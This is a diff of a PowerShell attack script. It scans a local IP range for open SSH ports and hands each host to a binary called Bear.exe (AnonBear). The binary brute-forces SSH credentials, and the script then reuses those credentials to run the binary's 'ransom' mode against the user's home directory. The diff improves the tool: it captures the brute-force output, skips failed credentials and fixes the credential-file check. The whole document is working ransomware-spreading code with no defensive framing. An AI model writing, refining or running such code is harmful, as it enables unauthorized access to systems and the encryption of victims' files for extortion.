@@ -1,4 +1,4 @@
-function Expand-IPRange {
+ function Expand-IPRange {
     param ($range)
     $start, $end = $range -split '-'
     $startIP = [System.Net.IPAddress]::Parse($start).GetAddressBytes()
@@ -60,26 +60,56 @@ function pscan {
                 $status = "Open"
                 $color = "Green"
                 $hostPart = "{0,-15} tcp/{1,-5} - " -f $h, $port
+                $ip_only = "{0,-15}" -f $h
                 Write-Host "$hostPart$status" -ForegroundColor $color
+
                 # Insert bruteforce SSH here. aka run AnonBear with ssh_bf flag
                 #Start-Process -FilePath AnonBear.exe -ArgumentList [remote, $h, x:x, ssh_bf]
-                $cred = & .\AnonBear.exe remote $h x:x ssh_bf
+                $exePath = "$env:TEMP\Bear.exe"
+                
+                $tempFile = [System.IO.Path]::GetTempFileName()
+                Start-Process -FilePath $exePath `
+                -ArgumentList "remote", $ip_only, "x:x", "ssh_bf" `
+                -NoNewWindow -Wait `
+                -RedirectStandardOutput $tempFile
+
+                # Read the last line of output
+                $cred = Get-Content $tempFile | Select-Object -Last 1
+                Remove-Item $tempFile
+                Write-Host "Last line: $cred"
+                
+                # Write-Host $exePath remote $ip_only x:x ssh_bf
+                # $cred = & $exePath remote $ip_only x:x ssh_bf
+                # $cred = $cred[-1]
+                if ($cred -eq "----------"){
+                    Write-Host "Credential Not Good"
+                    continue
+                }
                 $parts = $cred -split ":", 2  # Split into two parts only
                 $usern = $parts[0].Trim()
 
                 # Found, use Anonbear for remote ransomware
-                $output = & .\AnonBear.exe remote $h $cred ransom "/home/$usern/"
+
+                Start-Process -FilePath $exePath `
+                -ArgumentList "remote", $ip_only, $cred, "ransom", "/home/$usern/" `
+                -NoNewWindow -Wait `
+                -RedirectStandardOutput $tempFile
+
+                # $output = & $exePath remote $ip_only $cred ransom "/home/$usern/"
+                Write-Host "$ip_only Ransomed" -ForegroundColor $color
+                $res = Get-Content $tempFile
+                Remove-Item $tempFile
+                Write-Host "Result: $res"
             }
         }
     }
 }
 
-$filePath = "C:\Windows\Temp\schedule.txt"
+$filePath = "$env:TEMP\schedule.txt"
 
-if (Test-Path $filePath) {
+if (!(Test-Path $filePath)) {
     Write-Host "Please Prearare credentials for BF"
     exit
 }
 
 pscan -t "192.168.8.110-192.168.8.120" -p "22"
-
